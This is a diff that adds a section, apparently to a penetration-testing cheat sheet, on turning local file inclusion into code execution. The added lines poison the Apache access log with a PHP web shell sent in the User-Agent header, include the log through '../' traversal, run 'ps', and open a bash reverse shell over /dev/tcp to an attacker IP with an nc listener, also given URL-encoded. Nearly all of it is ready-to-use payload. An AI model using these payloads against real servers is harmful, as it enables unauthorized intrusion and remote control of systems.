@@ -2691,6 +2691,35 @@ Para  obtener una shell
 &cmd=SHELL
 ```
 
+Change User-Agent. Only once and then remove it
+
+```c
+<?php echo system($_GET['cmd']); ?>
+```
+
+```c
+../../../../../../../../../var/log/apache2/access.log
+```
+
+Then try to list process
+
+```c
+../../../../../../../../../var/log/apache2/access.log&cmd=ps
+```
+
+for cmd=
+
+```c
+bash -c "bash -i >& /dev/tcp/LOCAL_IP/LOCAL_POR 0>&1"
+listen to the LOCAL_PORT nc -nlvp LOCAL_PORT
+```
+
+URL Encoded
+
+```c
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP%2FPORT%200%3E%261%22
+```
+
 ##### Until php 5.3
 
 ```c
